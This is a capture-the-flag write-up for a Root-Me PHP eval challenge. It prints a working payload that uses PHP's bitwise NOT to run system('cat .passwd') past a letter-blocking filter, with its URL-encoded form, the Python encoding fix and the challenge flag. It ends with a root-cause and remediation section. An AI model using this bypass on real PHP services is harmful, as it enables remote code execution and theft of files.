# Root-Me — Web-Server: PHP - Eval (ch57) — SOLVED

**Target:** http://challenge01.root-me.org/web-serveur/ch57/
**Challenge:** "Non-alphanumeric PHP code" (40 pts, author chmod)
**Goal:** Find a vulnerability in this service and exploit it. The flag is in `.passwd`.

## Flag

```
M!xIng_PHP_w1th_3v4l_L0L
```

24 characters. Independently confirmed: `wc -c .passwd` → `25` (24 chars + LF) and
`od -c .passwd` → `M ! x I n g _ P H P _ w 1 t h _ 3 v 4 l _ L 0 L \n`.

## The vulnerability (source provided)

```php
if (isset($_POST['input'])) {
    if (!preg_match('/[a-zA-Z`]/', $_POST['input'])) {
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");     // <-- sink
        print '</fieldset>';
    } else {
        echo "<p>Dangerous code detected</p>";
    }
}
```

`eval()` on user input is the bug (CWE-95). The "protection" is a filter that rejects
**any ASCII letter and the backtick** — anywhere in the payload, including inside string
literals. Note there is no `/u` flag, so the regex works byte-wise.

## Exploit

PHP's bitwise NOT (`~`) on a string inverts every byte, so letters can be **synthesised from
high bytes**. `p` is `0x70`, so `~"\x8f"` is `"p"`:

| want | byte | `~` of it |
|---|---|---|
| `s` | 0x73 | 0x8C |
| `y` | 0x79 | 0x86 |
| `s` | 0x73 | 0x8C |
| `t` | 0x74 | 0x8B |
| `e` | 0x65 | 0x9A |
| `m` | 0x6D | 0x92 |

PHP 7 additionally lets a parenthesised string expression be **called as a function**
(`(~'…')(…)`), so the whole payload is:

```
(~'<8C 86 8C 8B 9A 92>')(~'<9C 9E 8B DF D1 8F 9E 8C 8C 88 9B>')
```

which evaluates to `system('cat .passwd')`. URL-encoded:

```
input=%28~%27%8C%86%8C%8B%9A%92%27%29%28~%27%9C%9E%8B%DF%D1%8F%9E%8C%8C%88%9B%27%29
```

Response:

```html
<fieldset><legend>Result</legend>M!xIng_PHP_w1th_3v4l_L0L
M!xIng_PHP_w1th_3v4l_L0L</fieldset>
```

The value appears twice because `system()` writes the output *and* `print` prints `system()`'s
return value (the last line) — expected, not a quirk to chase.

## The gotcha that cost the most time: send raw bytes, not a UTF-8 string

My first attempt produced:

```
Fatal error: Call to undefined function =s=y=s=t=e=m()
```

That `=` is the tell. I had built the payload as a Python **`str`** containing `\x8c` (i.e.
U+008C) and let `urllib.parse.urlencode` handle it — which **UTF-8 encodes** the high bytes
first, turning `0x8C` into `0xC2 0x8C`. The server then decoded two bytes instead of one, and
`~0xC2` is `0x3D` = `=`.

Fix: build the payload as **`bytes`** and percent-encode byte-wise with
`urllib.parse.quote_from_bytes`:

```python
body = b"input=" + urllib.parse.quote_from_bytes(payload).encode()
```

Lesson: whenever a payload depends on exact byte values, keep it in `bytes` end-to-end —
any `str` round-trip through a URL encoder will silently re-encode it.

## Verification

| Check | Result |
|---|---|
| `cat .passwd` | `M!xIng_PHP_w1th_3v4l_L0L` |
| `wc -c .passwd` | `25` — matches 24 chars + newline |
| `od -c .passwd` | `M ! x I n g _ P H P _ w 1 t h _ 3 v 4 l _ L 0 L \n` |
| **control:** `cat /nope_zzz` | empty output |

The control matters: a non-existent file yields nothing, so the flag output is genuinely the
file's contents rather than a fixed response.

Also confirmed the filter is real — a payload containing any letter returns
`Dangerous code detected`. The generated payload contains **no** ASCII letters and no backtick
(the helper asserts this before sending).

## Root cause & fix

Two independent problems:

1. **`eval()` on user input** — CWE-95 (Improper Neutralization of Directives in Dynamically
   Evaluated Code). Even a calculator does not need `eval`; a real expression parser, or
   `intval()`/`floatval()` on a whitelisted grammar, removes the class entirely.
2. **A blacklist as the "protection."** `preg_match('/[a-zA-Z`]/', …)` is a blacklist, and
   blacklists lose: PHP's `~` operator, string increment (`'a'++` → `'b'`), `chr()`, and
   variable functions all build arbitrary identifiers from non-alphanumeric input. Filtering
   characters cannot make `eval` safe — only removing `eval` can.

If a filter were genuinely required, an **allow-list** of a numeric grammar
(`/^[0-9+\-*/(). ]+$/`) would at least be sound; note the challenge's own blacklist would
still be bypassed by `~`, so the allow-list is the only defensible shape here.
